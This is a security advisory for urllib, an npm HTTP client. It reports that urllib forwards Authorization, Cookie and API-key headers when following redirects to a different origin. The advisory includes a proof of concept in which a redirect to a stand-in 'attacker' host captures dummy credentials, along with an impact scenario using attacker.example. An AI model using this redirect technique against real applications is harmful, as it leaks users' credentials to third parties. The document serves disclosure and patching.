# [H] urllib's cross-origin redirects preserve credential-bearing request headers, leading to potential credential leakage

## Summary
Severity: High
Advisory: GHSA-hq3h-g68c-hp78
CVE: CVE-2026-55553
CWE: CWE-200, CWE-201, CWE-522
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-08-25
Source: https://github.com/advisories/GHSA-hq3h-g68c-hp78
Type: github-advisory

## Affected
- npm: `urllib` — affected >=3.0.0 <4.9.1
- npm: `urllib` — affected >=0 <2.44.1

## Details
## Summary

urllib supports redirect-following through `followRedirect`, which is expected behavior for an HTTP client. The issue is that, when following a redirect to a **different origin**, urllib preserves the caller-supplied request headers verbatim, including credential-bearing headers such as `Authorization`, `Cookie`, `Proxy-Authorization`, and custom auth headers (`x-api-key`, `x-auth-token`, `x-access-token`).

If the redirect target is attacker-controlled or outside the trust boundary of the original target, credentials intended for the original origin can be delivered to the redirected origin. In a local multi-library reproduction, urllib v4.9.0 was the only tested client that stripped no headers on cross-origin redirect.

## Affected behavior

Confirmed against urllib v4.9.0. The relevant code is in `#requestInternal` ([`src/HttpClient.ts:639-656`](https://github.com/node-modules/urllib/blob/master/src/HttpClient.ts#L639-L656)):

```ts
     // https://developer.mozilla.org/en-US/docs/Web/HTTP/Redirections
      if (RedirectStatusCodes.includes(res.statusCode) && maxRedirects > 0 && requestContext.redirects < maxRedirects) {
        if (res.headers.location) {
          requestContext.redirects++;
          const nextUrl = new URL(res.headers.location, requestUrl.href);
          // Ensure the response is consumed
          await response.body.arrayBuffer();
          debug(
            'Request#%d got response, status: %s, headers: %j, timing: %j, redirect to %s',
            requestId,
            res.status,
            res.headers,
            res.timing,
            nextUrl.href,
          );
          return await this.#requestInternal(nextUrl.href, options, requestContext);
        }
      }
```

The recursive call `this.#requestInternal(nextUrl.href, options, requestContext)` reuses the original `options` object. If the caller supplied credential-bearing headers in `options.headers`, those headers are reused for the redirected request, regardless of whether the redirect target shares the original origin.

## Redirect-header handling context

The CHANGELOG suggests that redirect-related header handling has been considered before, including changes around preserving or cleaning up `Host` during redirects. Given that context, sensitive-header stripping may be an unintentional gap rather than an explicit policy decision.

## Proof of Concept: 3-container topology

The reproduction uses three separate containers (`partner`, `attacker`, `client`) connected over a Podman bridge network. Each container has its own hostname, port, and process, so the redirect crosses a clear origin boundary. This is not a `localhost` vs `127.0.0.1` same-host case.

```text
[client container]                       [partner container]              [attacker container]
hostname: client                         hostname: partner                hostname: attacker
                                         port: 3001                       port: 3002
   urllib v4.9.0
        │
        │ GET http://partner:3001/start
        │ + 6 credential-bearing headers
        ↓
                                         302 Location:
                                         http://attacker:3002/captured
                                                   │
                                                   │ urllib follows redirect
                                                   │ → DIFFERENT ORIGIN
                                                   │   (different hostname and port)
                                                   │ → all 6 headers preserved
                                                   ↓
                                                                          headers logged
                                                                          inside attacker
                                                                          container
```

The origin tuple is `(scheme, host, port)`:

- source origin: `http://partner:3001`
- destination origin: `http://attacker:3002`

The host and port both differ, so the redirect target is a different URL origin. The headers are logged in a separate process inside a separate container.

**Client invocation** (`client/poc.mjs`):

```javascript
import urllib from 'urllib' // v4.9.0

await urllib.request('http://partner:3001/start', {
  followRedirect: true,
  maxRedirects: 5,
  headers: {
    'Authorization': 'Bearer LIVE-AUTH-3CONTAINER',
    'Cookie': 'session=LIVE-COOKIE-3CONTAINER',
    'Proxy-Authorization': 'Bearer proxy-LIVE-3CONTAINER',
    'x-api-key': 'sk-LIVE-3CONTAINER-x123',
    'x-auth-token': 'auth-LIVE-3CONTAINER-y456',
    'x-access-token': 'access-LIVE-3CONTAINER-z789',
  },
})
```

**Observed result**  
urllib 4.9.0, Node.js 22.22.2, linux/arm64:

```text
[attacker] CAPTURED HEADERS:
  "authorization":       "Bearer LIVE-AUTH-3CONTAINER"
  "cookie":              "session=LIVE-COOKIE-3CONTAINER"
  "proxy-authorization": "Bearer proxy-LIVE-3CONTAINER"
  "x-api-key":           "sk-LIVE-3CONTAINER-x123"
  "x-auth-token":        "auth-LIVE-3CONTAINER-y456"
  "x-access-token":      "access-LIVE-3CONTAINER-z789"
  "user-agent":          "node-urllib/4.9.0 Node.js/22.22.2 (linux; arm64)"

LEAK RATE: 6/6
```

The `user-agent` value confirms that the redirected request was sent by urllib v4.9.0.

## Independent reproduction: multi-library comparison

A separate local harness tested the same cross-origin redirect topology against multiple Node.js HTTP clients:

- same `partner:3001 → attacker:3002` redirect;
- same six credential-bearing headers;
- same RFC 6454 origin boundary.

The results were deterministic across runs:

| Library | Leak rate | Headers stripped on cross-origin redirect |
|---|---:|---|
| undici 6.21.0 | 3/6 | `authorization`, `cookie`, `proxy-authorization` |
| needle 3.5.0 | 3/6 | `authorization`, `cookie`, `proxy-authorization` |
| node-fetch 3.3.2 | 4/6 | `authorization`, `cookie` |
| superagent 10.3.0 | 4/6 | `authorization`, `cookie` |
| @hapi/wreck 18.1.0 | 4/6 | `authorization`, `cookie` |
| request 2.88.2 | 5/6 | `authorization` |
| **urllib 4.9.0** | **6/6** | **none** |

`urllib` was the only tested library that stripped no headers on cross-origin redirect. Custom auth headers such as `x-api-key`, `x-auth-token`, and `x-access-token` are an ecosystem-wide gap in this comparison. The urllib-specific issue is the absence of any strip step for standard credential-bearing headers such as `Authorization`, `Cookie`, and `Proxy-Authorization`.

The reproduction harness is small and can be shared if useful.

## Impact

This affects Node.js applications that use urllib to make authenticated HTTP requests while allowing redirects to be followed automatically.

```text
1. Application sends an authenticated request:
     GET https://api.partner.example/data
     Authorization: Bearer <token>
     Cookie: session=<session-id>

2. The partner endpoint, a compromised intermediary, or a misconfigured CDN returns:
     302 Location: https://attacker.example/captured

3. urllib follows the redirect and sends the original Authorization and Cookie headers
   to attacker.example.
```

This exposes credentials to an origin that was not the intended recipient. Depending on the credential type and server-side validation, the leaked credentials may be reusable against the original partner API or related services.

This requires no user interaction. Realistic triggers include compromised partner subdomains, DNS hijacking, malicious partner endpoints during onboarding, internal services redirecting across trust boundaries, or an open redirect upstream of urllib's call site.

## References
- https://github.com/node-modules/urllib/security/advisories/GHSA-hq3h-g68c-hp78
- https://github.com/node-modules/urllib/pull/812
- https://github.com/node-modules/urllib/pull/813
- https://github.com/node-modules/urllib/commit/7c86c465883ebd3dea5109c87d7bbe3b00960a16
- https://github.com/node-modules/urllib/commit/811a8d56e64e540bf6a19bf8b3737692f05d5c46
- https://github.com/node-modules/urllib
- https://github.com/node-modules/urllib/releases/tag/v2.44.1
- https://github.com/node-modules/urllib/releases/tag/v4.9.1
